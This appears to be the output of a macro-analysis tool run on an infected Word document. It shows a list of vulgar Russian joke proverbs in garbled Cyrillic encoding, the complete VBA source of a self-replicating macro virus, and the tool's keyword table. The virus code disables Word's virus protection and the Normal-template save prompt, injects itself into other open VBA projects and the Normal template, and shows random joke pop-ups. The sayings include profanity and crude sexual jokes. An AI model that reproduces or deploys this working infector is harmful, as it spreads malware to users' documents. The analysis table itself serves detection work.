'Òî, ÷òî æåíùèíå ïî äóøå, ìóæ÷èíå íå ïî êà˝ìàíó
'Òîìó âèäíåå, ó êîãî íîñ äëèííåå
'Òîìó ñòûäíî, ó êîãî âèäíî
'Òîùàÿ êî˝îâà åù¸ íå ãàçåëü
'Ò˝îå â ëîäêå, íå ñòåñíÿÿñü ñîáàêè
'Òû, ìàëûé, íå äó˝àê, è äó˝àê íå ìàëûé.
'Òÿæåëî â ëå÷åíèè - ëåãêî â ã˝îáó
'Ó áîá˝à äîá˝à íå èùóò
'Óëûáàéòåñü, øåô ëˇáèò èäèîòîâ
'Óìîì òû ìîæåøü íå áëèñòàòü, íî ñàïîãîì áëèñòàòü îáÿçàí!
'Óíèòàçó â äóøó íàñ˝àëè
'Óò˝î âå÷å˝à ä˝ÿííåå
'Óò˝î äîá˝ûì íå áûâàåò
'Óõîäÿ, ãàñèòå âñåõ.
'Ó÷åíüå - ñâåò, à çà ñâåò íàäî ïëàòèòü.
'Ó÷åíüå - ñâåò, à íåó÷åíûõ - òüìà!
'Ó÷åíüå ñâåò, à íåó÷åíüå - ÷óòü ñâåò íà ˝àáîòó...
'Ôà˝ø íåâîçìîæíî ï˝îâå˝íóòü íàçàä è ìÿñî èç êîòëåò íå âîññòàíîâèøü...
'Õè˝ó˝ãè ñ÷èòàˇò, ÷òî âíóò˝åííèé ìè˝ ÷åëîâåêà ëó÷øå âñåãî ˝àñê˝ûâàåòñÿ íà îïå˝àöèîííîì ñòîëå
'Õîçÿéñòâî âåñòè - íå õëàìîì ò˝ÿñòè
'Õî˝îøî ñìååòñÿ òîò, êòî ñìååòñÿ êàê ëîøàäü.
'Õî˝îøî ñìååòñÿ òîò, êòî ñò˝åëÿåò ïîñëåäíèì.
'Õî˝îøî, êîãäà ñîáàêà - ä˝óã, íî ïëîõî, êîãäà ä˝óã - ñîáàêà.
'Õî÷åøü áîëüøîãî è ÷èñòîãî - ïîìîé ñëîíà!
'Õóé - æåëåçî, ïîêà ãî˝ÿ÷èé.
'Öåëü îï˝àâäûâàåò ï˝îòèâîçà÷àòî÷íûå ñ˝eäñòâà.
'Öèâèëüíûé ñå˝ˇëüíèê.
'Öûïëÿò ïî îñåíè ñò˝åëÿˇò
'˘åãî ïèòü, òîãî íå ìèíîâàòü.
'˘åãî-òî õî÷åòñÿ, à êîãî íå çíàˇ...
'˘åì áîëüøå æåíùèíó ìû ìåíüøå, òåì ìåíüøå áîëüøå ìû åå!
'˘åì áîëüøå íàñ, òåì ìåíüøå èõ
'˘åì áû äèòÿ íå òåøèëîñü, ëèøü áû íå çàáå˝åìåíåëî.
'˘åì áû äèòÿ íå òåøèëîñü, ëèøü áû íå ˝óêàìè
'˘åì áû äèòÿ íå òåøèëîñü, ëèøü áû ñâîèõ íå íàäåëàëî.
'˘åì äàëüøå â ëåñ - òåì áîëüøå èçâ˝àùåíöåâ.
'˘åì äàëüøå â ëåñ, òåì áëèæå âûëåç.
'˘åì äàëüøå â ëåñ, òåì íó åãî íà õóé!
'˘åì äàëüøå â ëåñ, òåì òîëùå ïà˝òèçàíû
'˘åì äàëüøå â ëåñ, òåì ò˝åòèé ëèøíèé
'˘åì äàëüøå âëåç, òåì áëèæå âûëåç
'˘åì ìåíüøå äåâóøåê ìû ëˇáèì, òåì áîëüøå â˝åìåíè íà ñîí
'˘åì óäîá˝ÿëè, òî è âû˝îñëî.
'˘åì øè˝å íàøè ìî˝äû, òåì òåñíåå íàøè ˝ÿäû
'˘òî â èìåíè òåáå ìîåì, òû îöåíè ã˝óäè îáúåì
'˘òî â ˝îò âëåçëî, òî ïîëåçíî.
'˘òî â ˝îò, ÷òî ïî ëáó!
'˘òî åñòåñòâåííî - òî íå áåç î˝ãàçìà.
'˘òî ïîñååøü, òî óæå íå íàéäåøü!
'˘òî ïîñìååøü, òî è ïîæìåøü
'˘òî ñ âîçó óïàëî - òîìó è ãëàç âîí.
'˘òî ñ âîçó óïàëî, òî íå âû˝óáèøü òîïî˝îì.
'˘òîá òû æèë íà îäíó ˝åêëàìó
'˘òîáû óçíàòü ïå˝ñïåêòèâó íàäî åå ïîùóïàòü
'˘üÿ áû êî˝îâà ìû÷àëà, à òâîÿ áû çàñóíóëà ïàëåö â æîïó è íå ïèçäåëà!
'Øèëî - íå âîpîáåé, â ëåñ íå óáåæèò.
'Øèëî â ìåøêå íå óòàèøü - âñå ˝àâíî íàâå˝õ âñïëûâåò!
'Ùè äà êàøà - ñëàäêàÿ ïà˝î÷êà.
'˙êèïàæ ï˝îùàåòñÿ ñ âàìè è æåëàåò Âàì ï˝èÿòíîãî ïîëåòà
'˙òî âñå øèòî ïî âîäå áåëûìè âèëàìè.
'˙òî åùå ïèñÿìè ïî âîäå âèëÿíî.
'˙õ, õî˝îøî, êîãäà õî˝îøî êîí÷àåòñÿ!
'˚íîøè è äåâóøêè, îâëàäåâàéòå ä˝óã ä˝óãîì
'ß Âàñ ëˇáèë, äå˝åâüÿ ãíóëèñü
'ß çíàˇ êà˝àò˛, òûêâàíäî, äçˇäî è åùå ìíîîãî ñò˝àøíûõ ÑËÎÂ
'ß ëˇáëˇ òåáÿ, æèçíü, íó à òû ìåíÿ - ñíîâà è ñíîâà
'ß ìèëîãî óçíàˇ ïî êîëãîòêàì
'ß íà òåáå - íèêîãäà
'ß íàêëîíèëñÿ ïîñìîò˝åòü, íå íàêëîíèëàñü ëè îíà, ÷òîá ïîñìîò˝åòü, íå íàêëîíèëñÿ ëè ÿ...
'ß íå ñïëˇ ñ óòêàìè è ñ êó˝àìè òîæå íå ñïëˇ
'ß ñåáÿ íå ëˇáëˇ, ï˝îñòî î÷åíü í˝àâëˇñü
'ß ñåãîäíÿ íå òàêîé, êàê â÷å˝à (à â÷å˝à ÿ áûë âàùå íèêàêîé!)
'ß ñóõîé çàêîí áëÿë, áëÿäó è áëÿäü áóäó!
'ßçûê äî êèëëå˝à äîâåäåò
'ßçûê äî êëèòå˝à äîâåä¸ò
'ßéöà â ìóíäè˝àõ, êà˝òîøêà âñìÿòêó.
'ßéöà êó˝èöó äèñöèïëèíè˝óˇò
'ßéöà ëîìàíîãî íå ñòîèò.
'ßéöî îò êó˝èöû íåäàëåêî ïàäàåò.
'ßìùèê, íå ãîíè! Òû ãîíèøü, ÿìùèê!

Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_New()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            .InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ñ 1 Àï˝åëÿ Âàñ!", "Îïà?-Óãó!", "À âîò è ñåãîäíÿøíèé ï˝èêîë", "Word: ˙òî ÿ áóêâàëüíî òîëüêî ÷òî ï˝èäóìàë", "õå-õå", "Word: ˙òî ÿ â ¯óññêîì ˝àäèî óñëûøàë", "¯åêëàìíàÿ ñëóæáà Microsoft Word", "Word: Çàäîëáàëè ìåíÿ ˛òè ìàê˝îâè˝óñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ï˝èêîë ñåçîíà", "Word: Îé, ñåé÷àñ îïèñàˇñü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, "Ñ 1 Àï˝åëÿ Âàñ, " & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óì˝ó îò ñìåõà", "ï˝àâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ï˝èêîë", Assistant.Name & ": ˙òî ÿ áóêâàëüíî òîëüêî ÷òî ï˝èäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàˇñü...", "õå-õå", Assistant.Name & ": ˙òî ÿ â ¯óññêîì ˝àäèî óñëûøàë", "¯åêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ˛òè ìàê˝îâè˝óñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ï˝èêîë ñåçîíà")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

